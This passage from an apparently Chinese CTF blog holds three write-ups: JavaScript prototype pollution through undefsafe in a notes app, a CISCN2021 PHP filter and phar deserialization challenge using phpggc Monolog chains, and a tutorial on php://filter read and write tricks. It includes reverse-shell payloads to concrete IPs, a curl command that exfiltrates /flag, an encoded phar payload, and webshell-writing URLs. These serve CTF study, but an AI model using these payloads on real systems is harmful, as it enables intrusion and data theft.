<p>那么根据上文所述的，我们需要找一个会被原型链污染攻击的函数，能够找到函数undefsafe</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513180306475.png" alt="image-20210513180306475"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">    undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">    undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">    undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现有这么两处，跟踪get_note</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以发现完全是不可控的，因为我们的参数没有办法传进去，回去看另外一个</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现会将我们的参数接收，并且直接调用了该函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">notes.edit_note(id, author, enote);</span><br></pre></td></tr></table></figure>

<p>那我们直接TM</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;__proto__&amp;author&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;81.69.201.65&#x2F;9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>



<p>被拼接上之后执行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">undefsafe(this.note_list, __prott + &#39;.author&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1&#39;);</span><br></pre></td></tr></table></figure>



<p>这种情况下就污染成功了，回到status路径下即可执行命令</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513181545597.png" alt="image-20210513181545597"></p>
<p>根据代码还需要传一个raw，随便传一个东西就行，不干扰我们</p>
<p>我这几天BUU反弹shell出去就没成功过，所以尝试外带数据过去了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;__proto__&amp;author&#x3D;curl http:&#x2F;&#x2F;IP:PORT&#x2F;?data&#x3D;$(cat &#x2F;flag)&amp;raw&#x3D;ysllz</span><br></pre></td></tr></table></figure>



<p>得到flag</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513182833091.png" alt="image-20210513182833091"></p>
]]></content>
      <tags>
        <tag>原型链污染</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2021filter</title>
    <url>/2021/05/17/CISCN2021filter/</url>
    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><ul>
<li>laravel8 debug的复现</li>
<li>php filter流的操作</li>
</ul>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>guoke师傅太强了。。</p>
<p>跟这道题一个思路：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;264662.html</span><br></pre></td></tr></table></figure>



<p>清空log日志：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>





<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br><span class="line"></span><br><span class="line">/?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>





<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=6E=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=51=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4D=00=6A=00=6F=00=69=00=59=00=32=00=46=00=30=00=49=00=43=00=39=00=55=00=61=00=47=00=6C=00=7A=00=58=00=32=00=6C=00=7A=00=58=00=32=00=5A=00=73=00=59=00=57=00=46=00=68=00=5A=00=32=00=64=00=6E=00=5A=00=79=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=79=00=4F=00=69=00=4A=00=6A=00=59=00=58=00=51=00=67=00=4C=00=31=00=52=00=6F=00=61=00=58=00=4E=00=66=00=61=00=58=00=4E=00=66=00=5A=00=6D=00=78=00=68=00=59=00=57=00=46=00=6E=00=5A=00=32=00=64=00=6E=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=54=00=6D=00=69=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=54=00=6D=00=69=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=64=00=49=00=76=00=42=00=36=00=2B=00=68=00=6E=00=44=00=58=00=65=00=57=00=64=00=37=00=41=00=63=00=49=00=31=00=42=00=6C=00=49=00=54=00=41=00=55=00=34=00=6E=00=55=00=61=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a</span><br></pre></td></tr></table></figure>



<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">phar://../runtime/log/app.log/test.txt</span><br></pre></td></tr></table></figure>



<p>打了半天yii的链，结果发现附件里面给出了另外一个能打的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;monolog/monolog&quot;:&quot;1.19&quot;</span><br></pre></td></tr></table></figure>



<p>用这个生成的payload记得+一个a</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -d&#x27;phar.readonly=0&#x27; ./phpggc Monolog/RCE1 &quot;system&quot; &quot;ls&quot; --phar phar -o php://output | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>



<p>拉过去，打</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PHP伪协议的读写</title>
    <url>/2021/05/16/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/</url>
    <content><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在BUU的🐏城杯刷题的时候遇见的那个easyser，所以记录一些，但是我真想说这题目真弱智啊</p>
<p>然后就遇见一个伪协议的读写，其实这个已经遇见过很多次了，这次主要是写在hexo上，说不定以后线下比赛会遇得到呢？</p>
<p>贴上官方的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;wrappers.php.php</span><br></pre></td></tr></table></figure>

<p>首先总结读。</p>
<h1 id="读"><a href="#读" class="headerlink" title="读"></a>读</h1><p>重点就是php://filter 流。</p>
<p><img src="image-20210516201926891.png" alt="image-20210516201926891"></p>
<p>官方的文章中提到的三个可用函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">readfle</span><br><span class="line">file()</span><br><span class="line">file_put_contents</span><br><span class="line">file_get_contents</span><br></pre></td></tr></table></figure>



<p>常用的LFI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
</tr>
<tr>
<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
</tr>
<tr>
<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>这里根据官方的参数解读一下。</p>
<ul>
<li>resource 后跟要过滤的数据流，但是在CTF中大部分都是指定文件的。</li>
<li>read/write 这是一个可选参数，<strong>可以多选</strong> 过滤器，这就意味着可以玩很多骚操作</li>
</ul>
<p>实际上感觉读并没有什么好说的，利用伪协议流读文件主要是为了绕过某些文件中可能存在了过滤，如：</p>
<p>构造这么两个文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">include</span> ($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20210516202910770.png" alt="image-20210516202910770"></p>
<p>利用伪协议流还是可以读取到的</p>
<p>但如果直接读取就会因为被解析了exit语句而无法读取到后面的部分。</p>
<p><img src="image-20210516203051751.png" alt="image-20210516203051751"></p>
<h1 id="写"><a href="#写" class="headerlink" title="写"></a>写</h1><p>读一般不作为考点，只做来辅助，前段时间，呃，20年的时候我记得几个比赛都出了利用php伪协议流来进行写入文件</p>
<p>首先，有如下函数可以利用到PHP的协议流进行实战操作</p>
<ul>
<li>COPY</li>
<li>file_get_contents</li>
<li>file_put_contents</li>
<li>fopen (我测试的时候fwrite不允许利用伪协议流来写入)</li>
<li>readfile</li>
</ul>
<p>fopen:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$handle = fopen(<span class="string">&#x27;php://filter/convert.base64-encode/resource=1.php&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handle,<span class="string">&#x27;wuhuhu&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>file_put_contents:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a &#x3D; $_GET[0];</span><br><span class="line">$b &#x3D; $_GET[1];</span><br><span class="line">file_put_contents($b,$a);</span><br></pre></td></tr></table></figure>

<p>可以这样写入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php&amp;0&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<p><img src="image-20210516204853922.png" alt="image-20210516204853922"></p>
<p>除此之外，php还有很多过滤流的格式：</p>
<p><img src="image-20210516204955519.png" alt="image-20210516204955519"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 这简单等同于：</span></span><br><span class="line"><span class="comment">  readfile(&quot;http://www.example.com&quot;);</span></span><br><span class="line"><span class="comment">  实际上没有指定过滤器 */</span></span><br><span class="line"></span><br><span class="line">readfile(<span class="string">&quot;php://filter/resource=http://www.example.com&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其他的函数也是大同小异的。</p>
<h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><p>过滤器的url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php</span><br></pre></td></tr></table></figure>

<p>php提供的过滤器：</p>
<h2 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h2><h3 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h3><p>官方的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>方便测试写成：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>可以就这样写作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>

<p>这样写入的文件就会被用base64的方式加密。</p>
<h3 id="string-toupper"><a href="#string-toupper" class="headerlink" title="string.toupper"></a>string.toupper</h3><p><code>string.toupper</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtoupper.php">strtoupper()</a>函数处理所有的流数据。</p>
<p>大写写入的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.toupper&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>

<p><img src="image-20210516205945077.png" alt="image-20210516205945077"></p>
<h3 id="string-tolower"><a href="#string-tolower" class="headerlink" title="string.tolower"></a>string.tolower</h3><p><code>string.tolower</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据</p>
<p>同样，小写写入的内容</p>
<p>官方单独列出来的一个过滤器：</p>
<h3 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</span><br><span class="line"></span><br><span class="line">警告</span><br><span class="line">本特性已自 PHP 7.3.0 起废弃。强烈建议不要使用本特性。</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;g1&gt;This&lt;h1&gt; is&lt;/h1&gt; a test.&lt;/g1&gt;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* This is a test   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到的结果是所有的xml的标签都被删掉了。如果是尚未闭合的标签，同样的会将其删除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  全部被删除   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是如果将fwrite构造为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; asdasdasdasd\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>得到的结果便会是。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">asdasdasdasd</span><br></pre></td></tr></table></figure>

<p>所以题目如果允许我们控制写入内容的话，就可以尝试闭合前面的标签，就可以删除掉题目可以设置的代码了。</p>
<p>但是该标签又会遇见一个问题，就是我们写入的内容也会被他删除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; &lt;?php phpinfo(); \n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>好在php是允许同时利用多个协议流的。并且PHP的协议流顺序为：</p>
<ul>
<li>用A协议流处理一边文件</li>
<li>再用B协议流处理一边文件</li>
</ul>
<p>所以我们可以将我们的内容组合为 ?&gt; 然后在base64解密.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/5.php?0=php://filter/string.strip_tags|convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; Cjw/cGhwIHBocGluZm8oKTs=\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<h2 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h2><p>官方解释：</p>
<p>如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页。</p>
